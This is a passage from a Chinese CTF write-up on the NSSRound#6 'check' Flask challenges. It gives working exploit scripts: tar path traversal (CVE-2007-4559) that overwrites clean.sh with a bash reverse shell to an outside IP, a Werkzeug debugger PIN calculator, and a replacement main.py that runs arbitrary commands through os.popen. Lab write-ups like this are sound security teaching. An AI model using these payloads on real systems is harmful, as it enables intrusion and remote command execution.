class="number">1024</span></span><br><span class="line">ALLOWED_EXTENSIONS = <span class="built_in">set</span>([<span class="string">&#x27;tar&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allowed_file</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">        filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(__file__, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(file.filename)</span><br><span class="line">    <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename) <span class="keyword">and</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> file.filename <span class="keyword">and</span> <span class="string">&#x27;/&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> file.filename:</span><br><span class="line">        file_save_path = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], file.filename)</span><br><span class="line">        <span class="keyword">if</span>(os.path.exists(file_save_path)):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;This file already exists&#x27;</span></span><br><span class="line">        file.save(file_save_path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;This file is not a tarfile&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        tar = tarfile.<span class="built_in">open</span>(file_save_path, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">        tar.extractall(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>])</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(e)</span><br><span class="line">    os.remove(file_save_path)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;success&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/download&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_file</span>():</span><br><span class="line">    filename = request.form.get(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> filename <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">or</span> <span class="string">&#x27;/&#x27;</span> <span class="keyword">in</span> filename:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(filepath) <span class="keyword">or</span> <span class="keyword">not</span> os.path.isfile(filepath):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filepath, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/clean&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clean_file</span>():</span><br><span class="line">    os.system(<span class="string">&#x27;su ctf -c /tmp/clean.sh&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;success&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">True</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>这里和checkv1的话只有一处不一样</p><p><img src="../images/image-20230329192945502.png" alt="image-20230329192945502"></p><p><img src="../images/image-20230329192951184.png" alt="image-20230329192951184"></p><p>v1是用root用户来执行clean.sh</p><p>v2是用普通用户ctf来执行clean</p><p> <strong>这里的不同可能是因为出题人想的解法不同</strong></p><p>因为这里的解法用的是软链接，所以修改这里的并不影响</p><p><strong>payload</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://43.142.108.3:28089/&quot;</span></span><br><span class="line">filename = <span class="string">r&quot;./flag.tar&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>(<span class="params">url ,fileName</span>):</span><br><span class="line">    url = url + <span class="string">&quot;upload&quot;</span></span><br><span class="line">    file = &#123;<span class="string">&quot;file&quot;</span>:<span class="built_in">open</span>(fileName,<span class="string">&#x27;rb&#x27;</span>)&#125; <span class="comment">#这里是上传文件</span></span><br><span class="line">    response = req.post(url=url, files = file)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>(<span class="params">url</span>):</span><br><span class="line">    url = url+<span class="string">&quot;download&quot;</span></span><br><span class="line">    file = &#123;<span class="string">&quot;filename&quot;</span>:<span class="string">&quot;flag&quot;</span>&#125; <span class="comment">#这里是post数据</span></span><br><span class="line">    response = req.post(url, data=file)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    upload(url,filename)</span><br><span class="line">    download(url)</span><br></pre></td></tr></table></figure><h2 id="NSSRound-6-Team-check-Revenge"><a href="#NSSRound-6-Team-check-Revenge" class="headerlink" title="[NSSRound#6 Team]check(Revenge)"></a>[NSSRound#6 Team]check(Revenge)</h2><p>考点</p><p><img src="../images/image-20230329193554819.png" alt="image-20230329193554819"></p><p>题目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="string">&#x27;./uploads&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>] = <span class="number">100</span> * <span class="number">1024</span></span><br><span class="line">ALLOWED_EXTENSIONS = <span class="built_in">set</span>([<span class="string">&#x27;tar&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allowed_file</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">        filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(__file__, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename) <span class="keyword">and</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> file.filename <span class="keyword">and</span> <span class="string">&#x27;/&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> file.filename:</span><br><span class="line">        file_save_path = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], file.filename)</span><br><span class="line">        <span class="keyword">if</span>(os.path.exists(file_save_path)):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;This file already exists&#x27;</span></span><br><span class="line">        file.save(file_save_path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;This file is not a tarfile&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        tar = tarfile.<span class="built_in">open</span>(file_save_path, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">        tar.extractall(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>])</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(e)</span><br><span class="line">    os.remove(file_save_path)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;success&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/download&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_file</span>():</span><br><span class="line">    filename = request.form.get(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> filename <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">or</span> <span class="string">&#x27;/&#x27;</span> <span class="keyword">in</span> filename:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(filepath) <span class="keyword">or</span> <span class="keyword">not</span> os.path.isfile(filepath):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> os.path.islink(filepath):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">oct</span>(os.stat(filepath).st_mode)[-<span class="number">3</span>:] != <span class="string">&#x27;444&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filepath, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/clean&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clean_file</span>():</span><br><span class="line">    os.system(<span class="string">&#x27;su ctf -c /tmp/clean.sh&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;success&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(os.environ)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">True</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230329195008532.png" alt="image-20230329195008532"></p><p>这里相较于v2，就多了这两行代码</p><p>第一个是判断文件内容是否为软链接</p><p>第二个是判断上传的文件权限是不是444</p><p><strong>预期解</strong></p><p><strong>CVE-2007-4559</strong>漏洞，可以通过tar.extractall()函数的漏洞，解压文件时候，覆盖掉目录中的文件</p><p>flask开启了debug=true模式，会有/console控制台，计算出PIN码即可进入控制台。</p><p>覆盖<code>tmp/clean.sh</code>,执行命令，拿到shell，flag的权限是root，可以通过算PIN码，提权执行命令，因为<code>main.py</code>的权限是<code>root</code></p><p>main.py就是debug控制台那，是root权限，所以就可以通过控制台来读取flag</p><p>反弹shell的原因就是为了得获取靶机中的东西来计算pin码</p><ol><li>上传tar文件，覆盖掉clean.sh，调用clean()函数调用exp.sh，进行反弹shell<br><strong>exp.sh</strong>如下：</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &quot;bash -i &gt;&amp; /dev/tcp/101.42.39.110/666 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure><p>生成的时候得加权限</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x exp.sh</span><br></pre></td></tr></table></figure><p>x是可执行的意思</p><p><strong>exp.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">changeFileName</span>(<span class="params">filename</span>):</span><br><span class="line">    filename.name = <span class="string">&#x27;../../../../tmp/clean.sh&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> filename</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> tarfile.<span class="built_in">open</span>(<span class="string">&quot;exp.tar&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> tar:</span><br><span class="line">    tar.add(<span class="string">&#x27;exp.sh&#x27;</span>, <span class="built_in">filter</span>=changeFileName)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    url = <span class="string">&#x27;http://43.143.7.127:28589/upload&#x27;</span></span><br><span class="line">    response = req.post(url=url, files=&#123;<span class="string">&quot;file&quot;</span>: <span class="built_in">open</span>(<span class="string">&quot;exp.tar&quot;</span>, <span class="string">&#x27;rb&#x27;</span>)&#125;)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clean</span>():</span><br><span class="line">    url = <span class="string">&#x27;http://43.143.7.127:28589/clean&#x27;</span></span><br><span class="line">    response = req.post(url)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    upload()</span><br><span class="line">    clean()</span><br></pre></td></tr></table></figure><p>然后先生成一下tar包</p><p>这里就是先进行tar包的上传，上传之后，就会进行解压，解压之后就会覆盖掉clean.sh,然后在访问/clean就会执行代码反弹shell了</p><p><img src="../images/image-20230329203140055.png" alt="image-20230329203140055"></p><p>这里不能在本地弹，本地弹不上去，只能在linux下弹</p><p><img src="../images/image-20230329203255973.png" alt="image-20230329203255973"></p><p>flag文件中并没有flag，flag应该在you_could_never_guess_the_flag_path中，但是只有root用户能够读取，发现main.py是root权限运行，可以计算PIN码进入console控制台获取到flag</p><p><strong>生成pin码的脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sha1</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;root&#x27;</span><span class="comment"># /etc/passwd</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># 默认值</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># 默认值</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.10/site-packages/flask/app.py&#x27;</span> <span class="comment"># 报错得到</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485376912775&#x27;</span>,<span class="comment">#  /sys/class/net/eth0/address 16进制转10进制</span></span><br><span class="line">    <span class="comment">#machine_id由三个合并(docker就后两个)：1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup</span></span><br><span class="line">    <span class="string">&#x27;96cec10d3d9307792745ec3b85c8962099f22e5a1ea6fc770c8ef01846a5fdcb0335fa255abc4345c0bc72c44131a11f&#x27;</span><span class="comment">#  /proc/self/cgroup</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>1./etc/machine-id    3./proc/self/cgroup  这道题是用这两个</p><p><img src="../images/image-20230329205003667.png" alt="image-20230329205003667"></p><p>最后拿到flag</p><p><strong>非预期解</strong></p><p><em>Debug模式下</em>，当<code>app.py</code>内容发生变化时，<a href="https://so.csdn.net/so/search?q=flask&amp;spm=1001.2101.3001.7020">flask</a>会重新加载</p><p><strong>exp.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://1.14.71.254:28077/&#x27;</span></span><br><span class="line">filename = <span class="string">r&quot;main.py&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">changeFileName</span>(<span class="params">filename</span>):</span><br><span class="line">    filename.name=<span class="string">&#x27;../../../app/main.py&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> filename</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> tarfile.<span class="built_in">open</span>(<span class="string">&quot;exp.tar&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> tar:</span><br><span class="line">    tar.add(filename,<span class="built_in">filter</span>=changeFileName)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>(<span class="params">rawurl</span>):</span><br><span class="line"></span><br><span class="line">    url = rawurl + <span class="string">&quot;upload&quot;</span></span><br><span class="line">    response = req.post(url = url, files = &#123;<span class="string">&quot;file&quot;</span>:<span class="built_in">open</span>(<span class="string">&quot;exp.tar&quot;</span>,<span class="string">&#x27;rb&#x27;</span>)&#125;)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getFlag</span>(<span class="params">rawurl</span>):</span><br><span class="line">    url = rawurl + <span class="string">&#x27;download?filename=ls&#x27;</span></span><br><span class="line">    response = req.get(url)</span><br><span class="line">    <span class="built_in">print</span>(response.content)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    upload(url)</span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line">    getFlag(url)</span><br></pre></td></tr></table></figure><p><strong>main.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/download&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_file</span>():</span><br><span class="line">    filename = request.args.get(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> os.popen(filename).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">True</span>, port=<span class="number">80</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230329213526571.png" alt="image-20230329213526571"></p><p>这里就是使用上面的那个cve进行main.py的覆盖，覆盖后会进行重载，就是自己写一段main.py的代码，可以进行命令执行的，main.py是root的用户</p><p>然后就可以成功rce了</p><p>这三道题收获挺多</p><h2 